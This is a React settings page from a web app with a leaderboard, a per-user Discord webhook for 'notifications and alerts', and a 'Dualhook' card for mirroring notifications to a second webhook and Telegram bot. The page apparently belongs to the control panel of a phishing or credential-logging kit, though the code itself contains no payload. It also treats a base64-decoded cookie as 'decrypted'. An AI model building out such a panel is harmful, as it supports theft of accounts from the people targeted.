'use client'

import { useState, useEffect, FormEvent } from 'react'
import { Settings, Save, CheckCircle, Webhook, User, Server, Shield } from 'lucide-react'

export default function SettingsPage() {
  const [webhook, setWebhook] = useState<string>('')
  const [displayName, setDisplayName] = useState<string>('')
  const [directory, setDirectory] = useState<string>('')
  const [saved, setSaved] = useState<boolean>(false)

  useEffect(() => {
    try {
      const cookies = document.cookie.split(';')
      for (const c of cookies) {
        if (c.trim().startsWith('rc_session=')) {
          const val = decodeURIComponent(c.trim().split('=')[1])
          const parts = val.split(':')
          const decrypted = atob(parts[1] || '')
          const session = JSON.parse(decrypted)
          setDirectory(session.directory)
          break
        }
      }
    } catch {}
  }, [])

  const handleSave = async (e: FormEvent) => {
    e.preventDefault()
    
    try {
      await fetch('/api/settings', {
        method: 'PUT',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ 
          webhookUrl: webhook || undefined, 
          displayName: displayName || undefined 
        })
      })
      setSaved(true)
      setTimeout(() => setSaved(false), 2500)
    } catch {
      // Handle error silently
    }
  }

  return (
    <div className="min-h-screen bg-[#09090b] p-4 pb-24">
      <div className="max-w-2xl mx-auto">
        {/* Header */}
        <div className="flex items-center gap-3 mb-8">
          <div className="w-10 h-10 bg-gradient-to-br from-purple-500 to-pink-500 rounded-xl flex items-center justify-center">
            <Settings size={20} />
          </div>
          <div>
            <h1 className="text-2xl font-bold">Settings</h1>
            <p className="text-xs text-gray-500">Manage your workspace configuration</p>
          </div>
        </div>

        {/* Workspace Info Card */}
        <div className="bg-[#111] border border-[#27272a] rounded-2xl p-6 mb-6">
          <div className="flex items-center gap-3 mb-4">
            <div className="w-10 h-10 rounded-xl bg-blue-500/10 flex items-center justify-center">
              <Server size={20} className="text-blue-400" />
            </div>
            <div>
              <p className="text-sm text-gray-400">Workspace</p>
              <p className="font-semibold text-lg">{directory || 'Loading...'}</p>
            </div>
          </div>
          <div className="flex items-center gap-2 text-xs text-green-400 bg-green-500/10 px-3 py-2 rounded-lg w-fit">
            <Shield size={12} />
            Active & Connected
          </div>
        </div>

        {/* Settings Form */}
        <form onSubmit={handleSave} className="bg-[#111] border border-[#27272a] rounded-2xl p-6 space-y-6">
          <h2 className="font-semibold flex items-center gap-2">
            <User size={18} className="text-gray-400" />
            Profile Settings
          </h2>

          {/* Display Name */}
          <div className="space-y-2">
            <label className="block text-sm font-medium text-gray-300">
              Display Name
            </label>
            <div className="relative">
              <div className="absolute left-4 top-1/2 -translate-y-1/2 text-gray-500">
                <User size={18} />
              </div>
              <input
                type="text"
                value={displayName}
                onChange={(e) => setDisplayName(e.target.value)}
                placeholder="Enter your display name..."
                className="w-full bg-[#09090b] border border-[#27272a] rounded-xl pl-11 pr-4 py-3.5 text-white placeholder-gray-500 focus:outline-none focus:border-blue-500 focus:ring-2 focus:ring-blue-500/20 transition-all"
              />
            </div>
            <p className="text-xs text-gray-500">How others will see you on the leaderboard</p>
          </div>

          {/* Webhook URL */}
          <div className="space-y-2">
            <label className="block text-sm font-medium text-gray-300">
              Discord Webhook URL
            </label>
            <div className="relative">
              <div className="absolute left-4 top-1/2 -translate-y-1/2 text-gray-500">
                <Webhook size={18} />
              </div>
              <input
                type="url"
                value={webhook}
                onChange={(e) => setWebhook(e.target.value)}
                placeholder="https://discord.com/api/webhooks/..."
                className="w-full bg-[#09090b] border border-[#27272a] rounded-xl pl-11 pr-4 py-3.5 text-white placeholder-gray-500 focus:outline-none focus:border-blue-500 focus:ring-2 focus:ring-blue-500/20 transition-all font-mono text-sm"
              />
            </div>
            <p className="text-xs text-gray-500">Used for notifications and alerts</p>
          </div>

          {/* Save Button */}
          <button
            type="submit"
            className="w-full bg-gradient-to-r from-blue-500 to-purple-600 text-white font-semibold py-3.5 rounded-xl hover:from-blue-600 hover:to-purple-700 transition-all transform hover:scale-[1.01] active:scale-[0.99] flex items-center justify-center gap-2 shadow-lg shadow-blue-500/25"
          >
            {saved ? (
              <>
                <CheckCircle size={18} />
                Saved Successfully!
              </>
            ) : (
              <>
                <Save size={18} />
                Save Changes
              </>
            )}
          </button>
        </form>

        {/* Dualhook Info */}
        <div className="mt-6 bg-[#111] border border-[#27272a] rounded-2xl p-6">
          <h3 className="font-semibold mb-3 flex items-center gap-2">
            <Webhook size={18} className="text-purple-400" />
            Dualhook Configuration
          </h3>
          <p className="text-sm text-gray-400 mb-3">
            Configure dual notifications via environment variables on Vercel.
          </p>
          <div className="bg-[#09090b] rounded-xl p-4 space-y-2 font-mono text-xs">
            <p className="text-gray-500">DUALHOOK_WEBHOOK_URL</p>
            <p className="text-gray-500">DUALHOOK_TELEGRAM_BOT_TOKEN</p>
            <p className="text-gray-500">DUALHOOK_TELEGRAM_USER_ID</p>
          </div>
        </div>
      </div>
    </div>
  )
}
